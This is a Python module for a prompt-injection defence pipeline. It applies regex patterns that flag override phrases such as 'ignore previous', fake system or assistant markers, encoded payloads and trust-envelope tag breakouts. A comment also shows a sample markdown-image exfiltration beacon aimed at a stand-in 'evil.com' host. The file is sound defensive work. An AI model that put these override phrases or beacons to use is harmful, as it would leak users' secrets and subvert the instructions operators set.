"""Stage 2 -- Structural regex scan for prompt-injection patterns.

A fast, deterministic scan that runs BEFORE ML inference (Stage 3).
All patterns are compiled at module level for performance.
"""

from __future__ import annotations

import html
import re
from bisect import bisect_left
from collections.abc import Iterable, Iterator
from dataclasses import dataclass, field

from models import Stage2Verdict
from pipeline.stage1_extraction import normalize_text

# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class FlaggedSpan:
    """A single regex match with its category and location."""

    category: str
    matched_text: str
    line_number: int


@dataclass(frozen=True, slots=True)
class StructuralScanResult:
    """Result of the Stage 2 structural scan."""

    verdict: Stage2Verdict
    flags: list[FlaggedSpan] = field(default_factory=list[FlaggedSpan])
    penalty: float = 0.0


# ---------------------------------------------------------------------------
# Pattern categories
# ---------------------------------------------------------------------------

# Categories that trigger BLOCKED verdict
_BLOCKING_CATEGORIES = frozenset(
    {
        "instruction_override",
        "authority_impersonation",
        "prompt_boundary",
    }
)

# Categories that trigger SUSPICIOUS verdict
_SUSPICIOUS_CATEGORIES = frozenset(
    {
        "encoded_payload",
        "suspicious_url",
        "exfil_beacon",
        "envelope_breakout",
    }
)

# Pattern registry: (category, compiled_regex)
_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    # -- Instruction overrides (case-insensitive) --
    (
        "instruction_override",
        re.compile(
            r"ignore\s+(all\s+)?(previous|prior|above)",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"disregard(?:(?!disregard|\n\n)[\s\S])*?instructions",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"new\s+(directive|instruction|task|objective)",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"\[SYSTEM\]",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"<system>",
            re.IGNORECASE,
        ),
    ),
    (
        "instruction_override",
        re.compile(
            r"---INSTRUCTIONS---",
            re.IGNORECASE,
        ),
    ),
    # -- Authority impersonation (some need line-start anchors) --
    (
        "authority_impersonation",
        re.compile(
            r"\[admin\]",
            re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"\[poppy\]",
            re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^assistant:",
            re.MULTILINE | re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^POPPY:",
            re.MULTILINE | re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"^System:",
            re.MULTILINE | re.IGNORECASE,
        ),
    ),
    (
        "authority_impersonation",
        re.compile(
            r"user\s+with\s+elevated",
            re.IGNORECASE,
        ),
    ),
    # -- Encoded payloads --
    (
        "encoded_payload",
        re.compile(
            r"[A-Za-z0-9+/]{40,}={0,2}",
        ),
    ),
    (
        "encoded_payload",
        re.compile(
            r"rot13",
            re.IGNORECASE,
        ),
    ),
    (
        "encoded_payload",
        re.compile(
            r"(?:\\x[0-9a-fA-F]{2}){4,}",
            re.IGNORECASE,
        ),
    ),
    # -- Prompt boundary markers --
    (
        "prompt_boundary",
        re.compile(
            r"```system",
            re.IGNORECASE,
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"```instructions",
            re.IGNORECASE,
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"<\|im_start\|>",
            re.IGNORECASE,
        ),
    ),
    (
        "prompt_boundary",
        re.compile(
            r"<\|endoftext\|>",
            re.IGNORECASE,
        ),
    ),
    # -- Suspicious URLs --
    (
        "suspicious_url",
        re.compile(
            r"data:(?:text|image|application|audio|video|font)/",
            re.IGNORECASE,
        ),
    ),
    (
        "suspicious_url",
        re.compile(
            r"javascript:",
            re.IGNORECASE,
        ),
    ),
    (
        "suspicious_url",
        re.compile(
            r"""(?:href|src)\s*=\s*["']?https?://(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})""",
            re.IGNORECASE,
        ),
    ),
    # -- Exfiltration beacons --
    # Matches markdown images with template/interpolation syntax in the URL,
    # which is the actual data-exfiltration pattern (e.g. ![img](https://evil.com/{{secret}}).
    # Plain markdown images without dynamic content are not flagged.  The alt
    # text stops at the first ']' and both it and the URL part stop at the next
    # '![', so each attempt ends at the following start token and the scan is
    # linear on hostile input (a bare '[^\]]*' alt is quadratic on '![![![...').
    (
        "exfil_beacon",
        re.compile(
            r"!\[(?:(?!!\[)[^\]])*\]\(https?://(?:(?!!\[)[^)])*?(?:\{\{|\$\{|%7[Bb])",
            re.IGNORECASE,
        ),
    ),
    # -- Envelope tag breakout --
    # Any sequence that opens or closes a wrapper tag in fetched content is an
    # active attempt to escape the trust envelope.  Covers literal '<', named
    # entity '&lt'/'&lt;', numeric entity '&#60'/'&#60;', and hex entity
    # '&#x3c'/'&#x3c;' (semicolon optional — browsers decode both forms).
    # Flagged SUSPICIOUS so trust score is depressed and <retrieval_warning>
    # is rendered.
    (
        "envelope_breakout",
        re.compile(
            r"(?:<|&lt;?|&#0*60;?|&#x0*3c;?)\s*(?:/\s*)?"
            r"(?:retrieved_content|retrieval_note|retrieval_warning|retrieval_cache_note)\b",
            re.IGNORECASE,
        ),
    ),
]


# ---------------------------------------------------------------------------
# Line number lookup helper
# ---------------------------------------------------------------------------


def _newline_offsets(text: str) -> list[int]:
    """Offsets of every newline in ``text``, computed once per scanned text."""
    offsets: list[int] = []
    find = text.find
    at = find("\n")
    while at != -1:
        offsets.append(at)
        at = find("\n", at + 1)
    return offsets


def _line_number_of(newlines: list[int], match_start: int) -> int:
    """Return 1-based line number for a character offset (``bisect``, O(log n))."""
    return bisect_left(newlines, match_start) + 1


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def scan_structural(text: str) -> StructuralScanResult:
    """Run structural regex patterns against text.

    Parameters
    ----------
    text:
        The raw_text output from Stage 1 extraction.

    Returns
    -------
    StructuralScanResult with verdict, flagged spans, and penalty score.
    """
    flags: list[FlaggedSpan] = []
    newlines = _newline_offsets(text)

    for category, pattern in _PATTERNS:
        for match in pattern.finditer(text):
            flags.append(
                FlaggedSpan(
                    category=category,
                    matched_text=match.group(),
                    line_number=_line_number_of(newlines, match.start()),
                )
            )

    if not flags:
        return StructuralScanResult(verdict=Stage2Verdict.CLEAN)

    # Determine verdict based on category membership
    categories_found = {f.category for f in flags}

    if categories_found & _BLOCKING_CATEGORIES:
        return StructuralScanResult(
            verdict=Stage2Verdict.BLOCKED,
            flags=flags,
            penalty=0.0,
        )

    # Only SUSPICIOUS categories remain
    suspicious_count = sum(1 for f in flags if f.category in _SUSPICIOUS_CATEGORIES)
    penalty = max(-0.45, -0.15 * suspicious_count)

    return StructuralScanResult(
        verdict=Stage2Verdict.SUSPICIOUS,
        flags=flags,
        penalty=penalty,
    )


# ---------------------------------------------------------------------------
# Derived scan forms
# ---------------------------------------------------------------------------

# C0/C1 controls except tab, LF and CR. The one owner: the orchestrator's
# `/search` field normalisation imports this rather than keeping a copy.
_CONTROL_CHARS_RE = re.compile(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]")


def strip_control_chars(text: str) -> str:
    """Delete C0/C1 controls (keeping tab, LF and CR)."""
    return _CONTROL_CHARS_RE.sub("", text)


def decode_scan_text(text: str, *, unescape_levels: int) -> str:
    """Entity-decode *text* for scanning, then strip controls and re-normalise.

    The control strip runs after the decode because entities mint C0/C1
    characters of their own; the re-normalisation keeps entity-encoded
    whitespace from becoming a long run. Scan-only: never served or classified.
    """
    for _ in range(unescape_levels):
        text = html.unescape(text)
    return normalize_text(strip_control_chars(text))


def structural_scan_forms(text: str, *, html_parsed: bool) -> Iterator[str]:
    """Yield the distinct forms of *text* that stage 2 scans, lazily.

    The as-is text first, then its entity decode: one level when the text came
    out of an HTML parse (which already decoded one), two otherwise. Forms are
    deduplicated, never truncated (a cap is a padding bypass), and there is no
    fixed-point loop. A generator so a caller that stops early holds at most
    one derived form.
    """
    yield text
    decoded = decode_scan_text(text, unescape_levels=1 if html_parsed else 2)
    if decoded != text:
        yield decoded


def combine_scan_results(*results: StructuralScanResult) -> StructuralScanResult:
    """Merge scan results: worst verdict wins, flags/penalty from the first at it.

    "First" is argument order, so the as-is form keeps its own flags and
    penalty whenever it already holds the worst verdict. With no arguments the
    result is CLEAN.
    """
    best = StructuralScanResult(verdict=Stage2Verdict.CLEAN)
    for result in results:
        if _VERDICT_RANK[result.verdict] > _VERDICT_RANK[best.verdict]:
            best = result
    return best


_VERDICT_RANK = {
    Stage2Verdict.CLEAN: 0,
    Stage2Verdict.SUSPICIOUS: 1,
    Stage2Verdict.BLOCKED: 2,
}


def scan_structural_forms(forms: Iterable[str]) -> StructuralScanResult:
    """Scan each form as produced, stopping at the first BLOCKED.

    BLOCKED is the maximum verdict, so stopping cannot change the outcome.
    """
    best = StructuralScanResult(verdict=Stage2Verdict.CLEAN)
    for form in forms:
        best = combine_scan_results(best, scan_structural(form))
        if best.verdict == Stage2Verdict.BLOCKED:
            break
    return best
